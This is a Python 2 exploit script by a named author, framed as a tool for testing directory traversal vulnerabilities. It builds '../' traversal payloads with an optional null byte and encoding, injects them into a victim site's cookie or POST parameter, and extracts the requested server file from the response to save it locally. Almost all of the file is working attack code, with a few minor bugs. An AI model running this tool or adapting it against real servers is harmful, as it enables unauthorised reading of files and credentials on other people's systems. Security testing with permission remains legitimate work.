###############################################
#CREATED BY: DANYEL MORALES                   #
#FOR TESTING DIRECTORY TRAVERSAL VULNERABILITY#
###############################################
#VISIT: blog.tugaloper.com                 
#CONTACT ME: danielmorales@tugaloper.com
###############################################
from encode import encodeString
from ErrorHandlerMod import ErrorHandler
import argparse
import urllib2
import urllib
import re

class xploitDirectoryTraversal:

    #****DOMAIN****    
    __prefix='http://' #It is obviously
    __dominio='' #Domain name to attack
    __sufix='' #File or directory vulnerable
    __url=''    #URL of victim

    #****PATRONES****
    __patronInicio='' #Delimiter at the top, patron
    __patronFinal=''  #Delimiter at the bottom, patron
    
    #****TARGET FILE****     
    __archivoFinal=''   #Target Filename
    __pathVuln=""       #Directory of target
    __fileType=''       #File type of target
    
    #****COOKIES****
    __userPatron=""   #Patron for cookies
    __complement =''   #A complement for cookies.
    __NullByte=None #1>TRUE  0>FALSE
    __EncodeOpc=None #WithOutEncoding

    #****OTHERS****
    __typeExploit=None
    __requestVar=None
    
    __ERRHAND=None
    __choose=2 
    __numlinea="" #Represents the line  number of something.
    
    def __init__(self,dominie, sufije, archivoFinale, fileTypee):
        self.__ERRHAND=ErrorHandler()
        self.__dominio=dominie
        self.__sufix=sufije
        self.__archivoFinal=archivoFinale
        self.__fileType=fileTypee
        self.__url = self.__prefix+self.__dominio+self.__sufix
        
    def __del__(self):
        print "\t:)completed {}.{}".format( self.__archivoFinal, self.__fileType)    
        
    def startConnection(self):
        content=""
        if self.__fileType !="":
            self.__fileType="."+ self.__fileType
            
        archivo="files/"+self.__dominio+"/"+self.__pathVuln+"/"+self.__archivoFinal + self.__fileType
        if self.__ERRHAND.Error_ExistsFile(archivo) != 1:
            if self.__typeExploit==0:
                content=self.cookie()
            elif self.__typeExploit==1:
                content=self.postData()
            self.obtenerContenido(content)   
        else:
            print "The file already exists."
            
    def cookie(self):
        response = urllib2.urlopen(self.__url)
        headers = response.info()
        #self.reporte(1, response, headers)
        content=self.cabeceras(headers)
        response.close()
        return content
    
    def postData(self):
        
        url=self.__url
        var=self.__requestVar
        value=self.encodeMyStringPls(self.workAround_PostData()+self.__archivoFinal +"."+ self.__fileType,self.__EncodeOpc)
        data=urllib.urlencode({var:value})
        response = urllib.urlopen(url, data)
        return response
    
    def cabeceras(self, headers):
        i=0
        galletaDeterminada=self.determinarGalletita(headers)
        galletita=galletaDeterminada+self.NeedsDotColon(galletaDeterminada)+ self.determinarInjection()
        galletita=self.encodeMyStringPls(galletita,self.__EncodeOpc)
        
        referencia=self.__prefix + self.__dominio
        serv=self.__dominio
        navegador=self.determinarNavegador()
        RequestHeaders = { 'Cookie':galletita, 'Referer':referencia, 'Host':serv,'User-Agent':navegador}

        require = urllib2.Request(self.__url, None, RequestHeaders)    
        response = urllib2.urlopen(require)
        return response
    
    def encodeMyStringPls(self, string, opc):
        objSTR=encodeString(string, opc)
        string=objSTR.selectCase()
        return string
        
    def NeedsDotColon(self, galleta):
        if len(galleta)>0:
            return ';'
        else:
            return " "

    def workAround_PostData(self):
        directorio=""
        if len(self.__pathVuln)>0:
            directorio=(self.__pathVuln+"/").replace(r"//","/")
            
        count=directorio.count("/")
        if count > 0:
            if directorio.split("/")[count-1]=="":
                directorio+="/"
            if directorio.split("/")[0]=="":
                directorio=directorio.replace("/","",1)
        print directorio
        return directorio
    
    def determinatebackSlash(self):
        countingSlashes=sufije.count("/") - 1
        acumulateSlash=""        
        while countingSlashes != 0:
            acumulateSlash+="../" 
            countingSlashes-=1;
        return acumulateSlash
    
    def determinarInjection(self):
        directoryTras=self.__pathVuln+"/"+self.__archivoFinal + self.__fileType
        directoryBackTras=".." #self.determinatebackSlash()
        
        if self.__NullByte==1:
            self.__complement='%00'+self.__complement
        else:
            self.__complement=""
            
        cookieInj=self.__userPatron +'='+directoryBackTras+directoryTras + self.__complement
        
        return  cookieInj
           
    def determinarGalletita(self, headers):
        galletaOrig=headers['Set-Cookie']
        mo= re.match("(.+)\;", galletaOrig)
        galleta= mo.group(1)
        return galleta

    def determinarNavegador(self):
        naveg="Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
        return naveg
    
    def obtenerContenido(self, code):
        if self.__choose !=1:
            self.tratadoArchivos('temporal', self.__fileType, self.__patronInicio+'\n')
        else:
            self.tratadoArchivos('temporal', self.__fileType, '')
            
        varx=0
        vary=0
        for j,v in enumerate(code):
            for word in v.split():
                if varx==1 and not vary==1:
                    self.tratadoArchivos('temporal',  self.__fileType, v)
                else:
                    if  word.find(self.__patronInicio)>=0:
                        varx=1
                if  word.find(self.__patronFinal)>=0:
                        vary=1
        self.filtrarArchivo(self.__archivoFinal,  self.__fileType)

    def tratadoArchivos(self, nombreF, tipoF,  datoF):
        nombre=nombreF
        tipo=tipoF
        fileName=(nombre + tipo).rstrip("\r\n")
        archi=open(fileName, 'a')
        
        if self.__choose == 1:
            datoF = re.sub(self.__patronInicio, "", datoF)
            datoF = re.sub(self.__patronFinal, "", datoF)
            
        archi.write(datoF)
        archi.close()
        
    def filtrarArchivo(self,nombreF, tipoF):
        lineaAnterior=''
        fileName=(nombreF + tipoF).rstrip("\r\n")
        print "Creando ..." + fileName
        temporal = ('temporal' + tipoF).rstrip("\r\n")
        f = open(temporal, 'r')
        g = open(fileName,'w')
        for linea in f:
            if  not lineaAnterior == linea :
                g.write(linea)
                   
            lineaAnterior=linea
        g.close()
        f.close()
        
    def get_filetyp(self):
        return  self.__fileType
    
    def get_pathVulnToSource(self):
        return self.__pathVuln
            
    def set_name(self, archivoFinale):
        self.__archivoFinal=archivoFinale
        
    def set_filetyp(self, fileTypee):
        self.__fileType=fileTypee
        
    def set_pathVulnToSource(self, pathVuln):
        self.__pathVuln=pathVuln
    
    def set_choose(self, number):
        self.__choose=number

    def set_NullByte(self, NB):
        self.__NullByte=NB
        
    def set_patern(self, patronInicie, patronFinale):
        self.__patronInicio=patronInicie
        self.__patronFinal=patronFinale

    def set_complement(self, complement):
        self.__complement=complement
        
    def set_config_head(self, userPatron, complement):
        self.__userPatron= userPatron
        self.__complement = complement

    def set_EncodeOpc(self, opc):
        self.__EncodeOpc=opc

    def set_typeExploit(self, expl):
        self.__typeExploit=expl
        
    def set_requestVar(self, var):
        self.__requestVar=var
        
    def reporte(self,opcion, response, headers):
        if opcion==1:
            print 'RESPONSE:', response.getcode()
            print 'DATE    :', headers['date']
            print 'HEADERS :'
                        
            print '------------------------------------------------------'
            print '                 HTTP HEADERS VALUES                  '
            print '------------------------------------------------------'
                        
            for line in headers:
                print "[-]  {}:\n\t\t{}\n".format(line.rstrip(), headers[line.rstrip()])

                print '------------------------------------------------------'

                if opcion==2:
                    i=0
                    print '------------------------------------------------------'
                    print '                 ACCEPTED HTTP HEADERS                '
                    print '------------------------------------------------------'
                    for  line in headers:
                        i+=1    
                        print "[{}]  {}\n".format(i,line.rstrip())
                            
                if opcion==3:
                    for line in response:
                        print line.rstrip()
